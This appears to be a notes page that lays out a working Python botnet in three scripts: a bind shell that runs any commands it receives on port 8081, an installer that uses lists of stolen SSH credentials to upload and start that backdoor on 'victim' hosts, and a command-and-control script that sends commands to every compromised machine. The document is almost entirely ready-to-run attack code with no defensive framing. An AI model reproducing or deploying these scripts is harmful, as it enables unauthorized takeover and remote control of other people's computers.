### netshell.py script
First create a server script utilizing the [[Python Sockets Library]] to run on victim clients that will keep an open listening port. (In this case 8081). This script will listen on a specified port for incoming traffic and then run the traffic as a command on the shell. When this script is deployed on a machine, you can connect via telnet
`telnet <victim ip> <port>

``` python
#!/usr/bin/python3

#a simple network shell to run command received from someone else
import socket, subprocess, select

# set up a listener socket for incoming commands
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(('', 8081))
listener.listen(10)

#create a list for all client sockets
allsocks = [listener]

#store client info
client_info = {}

#loop to accept a connection and run a command that was received
while True:
	#now we have multiple sockets, let the os tell us which socket wants to talk
	ready, output, exceptions = select.select(allsocks, [], [])
	for sock in ready:
		if sock == listener:
			client, addr = listener.accept()
			print("New connection from", addr)
			allsocks.append(client)
			
			client_info[client] = {"addr": addr, "exit_requested": False}
		else:
			commbytes = sock.recv(1024)
			if not commbytes:
				print("Connection closed by", client_info[sock]["addr"])
				sock.close()
				allsocks.remove(sock)
				del client_info[sock]
			else:
				commlist = commbytes.decode().rstrip().split()
				print("Executing command", commlist)
				
				#change exit condition to true for the respective sock if "exit" is typed in client
				if commlist == ["exit"]:
					print("Exit command received from", client_info[sock]["addr"])
					client_info[sock]["exit_requested"] = True
				else:
				# use popen and communicate to run the command
					try:
						p1 = subprocess.Popen(commlist, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
						outbytes, errbytes = p1.communicate()
						result = "STDOUT:\n" + outbytes.decode() + "\nSTDERR:\n" + errbytes.decode()

					except OSError as e:
		          			result = "Error: " + str(e)

				sock.sendall(result.encode())
			
			
```


### botinstall.py script
The following script is used to transfer and deploy the netshell.py script on victim machines. The script takes a file path as an argument point towards a text file containing machines to compromise. The text file is organized as follows:
` ip, username, password \n`
This script uses the Python expect library
```python
#!/usr/bin/python3

import pexpect
import sys

def readlist(file_path):
	compromised_hosts = []
	with open(file_path, 'r') as file:
		for line in file:
			ip, username, password = line.strip().split()
			compromised_hosts.append((ip, username, password))
	print('Read compromised_hosts.txt')
	print('Installing backdoor on the following hosts: ' + str(compromised_hosts))
	return compromised_hosts
	

def installbots(ip, username, password):
	print('Executing payload on ' + ip)
	try:
		sftp_cmd = 'sftp ' + username + '@' + ip
		child = pexpect.spawn(sftp_cmd)
		child.expect('password')
		child.sendline(password)
		child.expect('sftp>')
		child.sendline('put netshell.py')
		child.expect('sftp>')
		child.sendline('exit')
		print("script uploaded")
		
		ssh_cmd = 'ssh ' + username + '@' + ip
		child = pexpect.spawn(ssh_cmd)
		child.expect('password:')
		child.sendline(password)
		child.expect('$')
		child.sendline('nohup python netshell.py &')
		child.expect('$')
		child.sendline('exit')
		print('shell started')
		
		
		with open('botted_hosts.txt', 'a') as file:
			file.write(ip + '\n')
	
	except Exception as e:
		print('error botting ' + ip + ' Error: ' + str(e))
	
 


hostfile = sys.argv[1]

hostlist = readlist(hostfile)

for ip, username, password in hostlist:
	installbots(ip, username, password)
print("botted_hosts.txt written")
```


### CandC.py Script
lastly this script sends commands to all compromised devices provided. This script takes the path to a text file containing compromised device information as the first argument. The file is to be formatted as follows:
` <victim ip> \n`


```python
#!/usr/bin/python3

import socket, sys

def read_bots(botfile):
	with open(botfile, 'r') as file:
		return [line.strip() for line in file]

def send_command(botip, command):
	try: 
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#listener.settimeout(1)
		listener.connect((botip, 8081))
		listener.sendall(command.encode())
		
		data = listener.recv(1024)
		print("Result from bot: " + botip + "\n" + data.decode() + "\n")
	except Exception as e:
		print( "Error connecting to " + botip + " Error: " + str(e) + "\n")


botips = read_bots(sys.argv[1])
while True:
	command = input("Enter command: ")
		
	if command.lower() == 'exit':
		break
		
	for bot_ip in botips:
		result = send_command(bot_ip, command)
		

	
```